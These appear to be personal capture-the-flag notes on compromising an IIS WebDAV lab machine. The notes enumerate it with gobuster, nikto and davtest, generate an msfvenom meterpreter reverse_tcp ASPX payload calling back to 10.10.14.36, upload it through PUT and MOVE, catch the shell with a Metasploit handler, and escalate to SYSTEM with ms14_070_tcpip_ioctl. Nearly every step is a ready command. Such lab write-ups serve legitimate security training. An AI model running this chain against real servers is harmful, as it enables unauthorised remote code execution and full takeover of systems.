1. Port 80 iis server. 
2. Gobuster 
   gobuster dir  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20 -u 10.10.10.15	
3. Run nikto scan
	nikto -host+ 10.10.10.15
4. Run davtest ### This is to test out put options and see if we can insert a file from there, we will
		## if we ca upload an executable file given that it is aspx server
	davtest -url http://10.10.10.15
5. With burp you can redirect web page to prxy to look at history within burp by causing a redirecty
   To achieve this you create a proxy listener from 127.0.0.1 port 80 with a redirect to 10.10.10.15 
   port 80 and then you can run davtest and see all requests from burp proxy automatically
	davtest -url http://localhost

6. Next up you identify that we the server is able to run aspx files. You can try uploading an aspx file
   with the PUT method however this will not work, however you can use the MOVE method to transfer that
   aspx file with the payload to move an html file to the location with a renamed aspx extension. This
   can be achieved as follows:
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.36 LPORT=1337 -f aspx
	### Place payload in burp repeater using the PUT method and upload payload as html file
	### Afterwards execute the MOVE method to trasfer the html to be used as an aspx file
	### use msfconsole and create a multihandler
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set lhost tun0
	set lport 1337
	exploit -j

7. Once you have gotten the shell search for suggestor on metasploit
	search suggester
	use post/multi/recon/local_exploit_suggester
	
8. You will find various exploits to run however, the use exploit/windows/local/ms14_070_tcpip_ioctl
   will work, run it. And use sessions -i <number> and getuid to verify we have gotten system on the box.
   Make sure that the correct lhost is set otherwise things may not work as expected.
	use exploit/windows/local/ms14_070_tcpip_ioctl
	set session 4
	set LHOST tun0
	set LPORT 5555
	run
	sessions -i 2
	getuid
	Server username: NT AUTHORITY\SYSTEM
